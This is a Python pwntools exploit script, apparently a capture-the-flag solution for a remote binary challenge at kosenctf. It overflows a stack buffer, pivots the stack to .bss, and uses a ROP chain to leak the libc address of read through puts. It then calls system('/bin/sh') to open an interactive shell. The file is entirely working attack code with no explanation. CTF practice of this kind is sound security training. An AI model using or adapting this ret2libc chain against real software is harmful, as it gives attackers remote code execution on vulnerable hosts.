#!/usr/bin/env python
from pwn import *

if len(sys.argv) == 1:
    s = process('./chall', env = {'LD_PRELOAD': './libc-2.27.so'})
else:
    s = remote('pwn.kosenctf.com', 9002)

elf = ELF('./chall')
libc = ELF('./libc-2.27.so')

pop_rdi = 0x4009b3
pop_rsi_r15 = 0x4009b1
leave = 0x40087a

bss_addr = elf.bss(0x500)

payload = ''
payload += 'A' * 0x70
payload += p64(bss_addr - 0x8)
payload += p64(pop_rdi) + p64(elf.got['read'])
payload += p64(elf.symbols['puts'])
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(bss_addr) + p64(0)
payload += p64(elf.symbols['read'])
payload += p64(leave)

s.sendafter('Input: ', payload)

s.recvline()
libc_base = u64(s.recvline(False).ljust(8, '\0')) - libc.symbols['read']
log.info('libc base: %#x' % libc_base)

payload = ''
payload += p64(pop_rdi) + p64(bss_addr + 0x18)
payload += p64(libc_base + libc.symbols['system'])
payload += '/bin/sh\0'

s.send(payload)

s.interactive()
